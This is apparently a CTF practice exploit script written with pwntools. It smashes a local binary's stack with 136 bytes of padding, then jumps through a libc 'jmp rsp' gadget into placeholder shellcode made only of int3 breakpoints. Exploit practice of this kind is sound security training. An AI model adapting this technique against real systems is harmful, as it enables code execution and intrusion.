#!/usr/bin/python

'''
same as the previous task, but here the stack address (and therefore the
shellcode address on the stack) is unknown.
'''

import struct
import sys

from pwn import *


context(arch='amd64', os='linux', endian='little', word_size=64)

binary_path = '/home/gbrls/ctf/easy-linux-pwn/bin/x86-64/04-shellcode-static'

p = process(binary_path)
#p = gdb.debug(binary_path, '''
#    set follow-fork-mode child
#''')


libc_off = 0x7ffff7dd9000 - 0x28000

# we assume this address is known
shellcode = b''
shellcode += asm('int3') * 2

# offset padding
payload = b''
payload += b'A' * 136
payload += p64(0x8b022 + libc_off) # jmp rsp # https://ir0nstone.gitbook.io/notes/binexp/stack/reliable-shellcode
payload += shellcode

# 

p.readuntil('> ')
p.write(payload)
p.interactive()
